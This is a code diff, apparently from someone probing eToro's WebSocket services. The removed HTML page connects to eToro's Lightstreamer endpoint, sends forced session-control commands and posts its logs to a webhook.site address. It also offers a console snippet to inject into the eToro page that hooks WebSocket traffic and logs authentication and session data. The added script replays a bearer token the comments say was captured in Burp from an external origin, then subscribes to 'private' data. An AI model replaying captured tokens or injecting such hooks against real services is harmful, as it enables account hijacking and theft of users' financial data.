@@ -1,266 +1,47 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lightstreamer - Deep Connection Test</title>
-    <style>
-        body {
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: monospace;
-            padding: 20px;
-        }
-        .success { color: #00ff00; }
-        .error { color: #ff4444; }
-        .info { color: #ffaa00; }
-        .critical { color: #ff00ff; }
-        .log {
-            border-bottom: 1px solid #333;
-            padding: 5px;
-            margin: 5px 0;
-            font-size: 12px;
-            word-break: break-all;
-        }
-        button {
-            background: #2a2a3e;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-            padding: 8px 15px;
-            margin: 5px;
-            cursor: pointer;
-        }
-        .status {
-            background: #1a1a2e;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-    </style>
-</head>
-<body>
-    <h1>🔌 Lightstreamer - Deep Connection Test</h1>
-    <div class="status" id="status">⚡ Pronto para testar</div>
+// TOKEN CAPTURADO NO BURP - É O MESMO DO DEVICELOGINDATA
+const WS_TOKEN = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwia2lkIjoiMjg0OTgiLCJ0eXAiOiJKV1QiLCJjdHkiOiJKV1QifQ..xUHCEgjCQ8ILl7-vFlOMRw.ZrHYolrianC2abTrnC-bHE5qeAsyKE4qXP_amX_T5HKjZOA1KYFOc9Z2Rm3XDHlbrLgAucceT7xmG8ukjikJ7rlJoDkVlJc1iYbxtbsxKtQs-v4ABpQXnFSYsbzSBYrA2csMKVyixBTEeOECbZ95ciKs5c4rvVkHP0KFQyi0lPwCXrrSXLva3tVuVwkY9e07ikwrnTDQ1NdEk31z6qYy7IRDFa7RlZO6hxijC3r1TAO0dCgMcOxKmfqslwWanwePPmR58KMH4QumAncSvVvtAYh0YH66yKj-KqYnjW44x9asonzXIcsE8INcS7pGacuQQKl1vrlqafZEFO5s_VKs4-Ur8rRVohh3S1e1y7YZAwH-yiJWpPnKUhTZTh_CyOKKCQVm8GC3C_C3-BykcfarEU2FgpAicKXFI2BIbSk1d4l8ycyMGRLFH7m_hnKoyaZlwIAMPu-tj38V-fAXAXoASLJ74NpnZy_I2l6_MaIU1x7I7OFswnBnuB7qh2RmDOMBrn2wsxRaepkCkrPngv24pPGgCBWF7wJVkc01O_PhEvYh3fT7H_Eso05GL3CCj0OmkN_YVl8mStHPu2dMIV9dljV2yhn49XYpfVJNFNeQb1cZAyhf1_eCCgLILYxhYPQIbLfMM66xITBgD-iAm1y46_HSYaAaXlt71a6wXpG4iiwnDBzIYDC1GibluYks_6eXPFUg23JJeU5oILvdAZD5z_M5MFrAz7iylS2YzV5MdAen6OpkkWHOcfU-0d4i2zq-HAl0aaCzWMOwMnvPem3hhLsbac0g0buhtV81VB4cYbMstMSBCJVtMUJ4t3vFP0rPFznxWFtBS-Bc3ymoFTZRuFEwQj8QOpV5lojOHSgXuzyIqUp6xEyt32l_vIhMv7U1NA2DQRKHX9ZXBT7wudEG5_hA5sMh3zFR9REOUly1Qe-lCdSXIfMpUPQWUNltgg-e35hjOWVqH9NGbm9nl59IZhSGaYZ7kezc3sl2vhECedOGU0Jhaj4QZGcVfflPf7iIBbzQ0zx8CEsvrr3BGRPMjW-fQbAnzPKh0O0u3k7WW1P_scKZZIFCT0kqVYkKWgDv-XHsphcsqHA6rQeauB1apTfRiJpYZAl_wmgPr8zLPgo-AoaIVTa2yD3o9KiSxkiyxBeYX4f4v6oei7McKuywzcxbxSl4lBP274k3Z-NkQcqvcMwQmqooNvPIn_9TpGd3RNJZWdV8GUg37z57Oq27ORuLnXH2HW1dPqIsM9RniA-4ZbJkf77ergKuctRyKdAb7P9lEnqSzYScuhKhirJsj-A0j7__ok2vKc04nOeIJrD8wBajufrJuid9xoaOj5J8o7VrHGXbrdyxErZD-ns7ht5L_sqozs2iiLH41zzB9iNl2ov4OkT7iqim4dVnDfTJmUPq0R8XHTU0_N2-I2pyu1oNkwArvoPIOIpmMf0JOLRG7hA_4jcmH5_HF9cvM52xxNVWMmze1RRH_kIkwHCh2zV7lD8pEZBJHzEaPAEexnrhQi9nRdsRg64SnSXV1Ro8NDdez9An9He7UWA92J82HzOcGdYvxTjYHHGHhdgkz_g.2iwz1FJNU2nSt8jipbQ_6rmyxheqFXkN07G-XZ8hd9M";
+
+console.log('🚀 TESTANDO TOKEN DO WEBSOCKET DO GITHUB PAGES');
+console.log('📍 Origem:', window.location.origin);
+console.log('🔑 Token tamanho:', WS_TOKEN.length);
+
+const ws = new WebSocket("wss://ws.etoro.com/ws");
+
+ws.onopen = () => {
+    console.log('✅ CONEXÃO ESTABELECIDA DE ORIGEM EXTERNA!');
     
-    <div>
-        <button onclick="testLightstreamerReal()">🌐 TESTE CONEXÃO REAL</button>
-        <button onclick="testWithFullHandshake()">🤝 TESTE HANDSHAKE COMPLETO</button>
-        <button onclick="testControlCommands()">🎮 TESTE COMANDOS CONTROLE</button>
-        <button onclick="injectIntoPage()">💉 INJETAR NA PAGINA ETORO</button>
-        <button onclick="clearLogs()">🗑️ LIMPAR</button>
-    </div>
+    // Usa o MESMO formato que o Burp capturou
+    ws.send(JSON.stringify({
+        id: crypto.randomUUID(),
+        operation: "Authenticate",
+        data: {
+            userKey: WS_TOKEN,
+            apiKey: WS_TOKEN
+        }
+    }));
+    console.log('📤 Mensagem de autenticação enviada');
+};
+
+ws.onmessage = async (event) => {
+    let data = event.data;
+    if (data instanceof Blob) data = await data.text();
+    console.log('📥 RESPOSTA:', data);
     
-    <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
-    
-    <script>
-        const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
-        let currentWs = null;
-        
-        function addLog(message, type = 'info') {
-            const logs = document.getElementById('logs');
-            const div = document.createElement('div');
-            div.className = `log ${type}`;
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logs.appendChild(div);
-            logs.scrollTop = logs.scrollHeight;
+    try {
+        const resp = JSON.parse(data);
+        if (resp.success === true) {
+            console.log('🔥🔥🔥 AUTENTICADO COM SUCESSO! 🔥🔥🔥');
+            console.log('✅ O TOKEN FUNCIONA DE ORIGEM EXTERNA!');
             
-            fetch(WEBHOOK, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ message, type, timestamp: Date.now() })
-            }).catch(() => {});
+            // Tenta acessar dados
+            ws.send(JSON.stringify({
+                id: crypto.randomUUID(),
+                operation: "Subscribe",
+                data: { topics: ["private"], snapshot: true }
+            }));
         }
-        
-        // Teste com headers e parâmetros corretos do Lightstreamer
-        function testLightstreamerReal() {
-            addLog('🚀 Iniciando teste Lightstreamer com parâmetros reais...', 'info');
-            
-            // O Lightstreamer espera uma URL específica com parâmetros
-            const lsUrl = "wss://push-lightstreamer.cloud.etoro.com/lightstreamer";
-            
-            currentWs = new WebSocket(lsUrl);
-            
-            currentWs.onopen = () => {
-                addLog('✅ Conexão TCP estabelecida', 'success');
-                document.getElementById('status').innerHTML = '✅ Conectado, enviando handshake...';
-                
-                // Handshake completo do Lightstreamer (formato correto)
-                const handshake = [
-                    "create_session",
-                    "LS_protocol=TLCP-2.2.0",
-                    "LS_cid=mgQkwtwdysogQz2BJ4Ji%20kOj2Bg",
-                    "LS_user=anonymous",
-                    "LS_adapter_set=PROXY_PUSH"
-                ].join('\r\n');
-                
-                addLog(`📤 Handshake: ${handshake.replace(/\n/g, '\\n')}`, 'info');
-                currentWs.send(handshake);
-                
-                // Depois de 2 segundos, tenta subscribe
-                setTimeout(() => {
-                    const subscribe = [
-                        "subscribe",
-                        "LS_mode=MERGE",
-                        "LS_group=instrument:100000",
-                        "LS_schema=LastPrice.Price.Change"
-                    ].join('\r\n');
-                    
-                    currentWs.send(subscribe);
-                    addLog(`📤 Subscribe: ${subscribe.replace(/\n/g, '\\n')}`, 'info');
-                }, 2000);
-            };
-            
-            currentWs.onmessage = (event) => {
-                let data = event.data;
-                if (typeof data === 'object' && data.text) data = data.text;
-                
-                addLog(`📥 RECEBIDO: ${data.substring(0, 500)}`, 'success');
-                
-                // Analisa a resposta do Lightstreamer
-                if (data.includes('CONOK')) {
-                    addLog('🎯 CONOK recebido! Sessão criada com sucesso!', 'critical');
-                    const sessionMatch = data.match(/SESSION_ID[:\s]+([A-Za-z0-9]+)/i);
-                    if (sessionMatch) {
-                        addLog(`🔑 SESSION ID: ${sessionMatch[1]}`, 'critical');
-                        localStorage.setItem('ls_session_id', sessionMatch[1]);
-                    }
-                }
-                
-                if (data.includes('PROBE')) {
-                    addLog('📡 Keep-alive PROBE recebido', 'info');
-                    // Responde ao probe
-                    currentWs.send('probe\r\n');
-                    addLog('📤 Resposta PROBE enviada', 'info');
-                }
-                
-                if (data.includes('ERROR')) {
-                    addLog(`❌ Erro Lightstreamer: ${data}`, 'error');
-                }
-            };
-            
-            currentWs.onerror = (error) => {
-                addLog(`❌ Erro: ${error}`, 'error');
-                document.getElementById('status').innerHTML = '❌ Erro na conexão';
-            };
-            
-            currentWs.onclose = (event) => {
-                addLog(`🔌 Fechado: ${event.code} - ${event.reason || 'sem motivo'}`, 'error');
-                document.getElementById('status').innerHTML = `🔌 Desconectado (${event.code})`;
-            };
-        }
-        
-        // Testa comandos de controle (como o que você interceptou)
-        function testControlCommands() {
-            if (!currentWs || currentWs.readyState !== WebSocket.OPEN) {
-                addLog('❌ Primeiro conecte com o botão "TESTE CONEXÃO REAL"', 'error');
-                return;
-            }
-            
-            addLog('🎮 Testando comandos de controle...', 'info');
-            
-            const commands = [
-                "control\r\nLS_reqId=1&LS_op=add&LS_table=1&LS_id=1",
-                "control\r\nLS_reqId=2&LS_op=destroy&LS_close_socket=true",
-                "control\r\nLS_reqId=3&LS_op=force&LS_session=*",
-                "status\r\n"
-            ];
-            
-            commands.forEach((cmd, i) => {
-                setTimeout(() => {
-                    currentWs.send(cmd);
-                    addLog(`📤 ${cmd.replace(/\n/g, '\\n')}`, 'info');
-                }, i * 2000);
-            });
-        }
-        
-        // Handshake completo com todos os parâmetros
-        function testWithFullHandshake() {
-            addLog('🤝 Testando handshake completo (todos parâmetros)...', 'info');
-            
-            const fullHandshake = `create_session
-LS_protocol=TLCP-2.2.0
-LS_cid=mgQkwtwdysogQz2BJ4Ji%20kOj2Bg
-LS_user=anonymous
-LS_adapter_set=PROXY_PUSH
-LS_idle_millis=0
-LS_content_length=true`;
-            
-            currentWs = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
-            
-            currentWs.onopen = () => {
-                addLog('✅ Conectado', 'success');
-                currentWs.send(fullHandshake);
-                addLog(`📤 ${fullHandshake.replace(/\n/g, '\\n')}`, 'info');
-            };
-            
-            currentWs.onmessage = (e) => {
-                let data = e.data;
-                if (typeof data === 'object') data = data.text || JSON.stringify(data);
-                addLog(`📥 ${data.substring(0, 300)}`, 'success');
-            };
-            
-            currentWs.onerror = () => addLog('❌ Erro', 'error');
-        }
-        
-        // INJETAR na página da eToro (executar DENTRO do site)
-        function injectIntoPage() {
-            addLog('💉 Este código deve ser executado DENTRO da página da eToro', 'critical');
-            addLog('📌 Copie o código abaixo e cole no console da eToro:', 'info');
-            
-            const codeToInject = `
-// CÓDIGO PARA EXECUTAR DENTRO DA ETORO
-(function interceptLightstreamer() {
-    console.log('🔍 Procurando conexões Lightstreamer ativas...');
-    
-    // Hook no WebSocket
-    const OriginalWS = window.WebSocket;
-    window.WebSocket = function(...args) {
-        if (args[0].includes('lightstreamer')) {
-            console.log('🎯 LIGHTSTREAMER DETECTADO:', args[0]);
-            const ws = new OriginalWS(...args);
-            
-            // Captura todas as mensagens
-            ws.addEventListener('message', (e) => {
-                console.log('📥 LS MESSAGE:', e.data);
-                if (e.data.includes('CONOK') || e.data.includes('SESSION')) {
-                    console.log('🔥 SESSION DATA:', e.data);
-                }
-            });
-            
-            const originalSend = ws.send;
-            ws.send = function(data) {
-                console.log('📤 LS SEND:', data);
-                if (data.includes('create_session') || data.includes('Authenticate')) {
-                    console.log('🔥 AUTH DATA:', data);
-                }
-                return originalSend.call(this, data);
-            };
-            return ws;
-        }
-        return new OriginalWS(...args);
-    };
-    console.log('✅ Hook instalado! Recarregue a página para capturar.');
-})();
-`;
-            
-            const textarea = document.createElement('textarea');
-            textarea.value = codeToInject;
-            textarea.style.width = '100%';
-            textarea.style.height = '200px';
-            textarea.style.background = '#1a1a2e';
-            textarea.style.color = '#00ff00';
-            textarea.style.fontFamily = 'monospace';
-            document.getElementById('logs').appendChild(textarea);
-        }
-        
-        function clearLogs() {
-            document.getElementById('logs').innerHTML = '';
-            if (currentWs) currentWs.close();
-            addLog('Logs limpos', 'info');
-        }
-        
-        addLog('✅ Lightstreamer Deep Test carregado', 'success');
-        addLog('🎯 Clique em "TESTE CONEXÃO REAL" para começar', 'info');
-    </script>
-</body>
-</html>
+    } catch(e) {}
+};
+
+ws.onerror = (e) => console.log('❌ Erro:', e);
+ws.onclose = (e) => console.log(`🔌 Fechado: ${e.code}`);
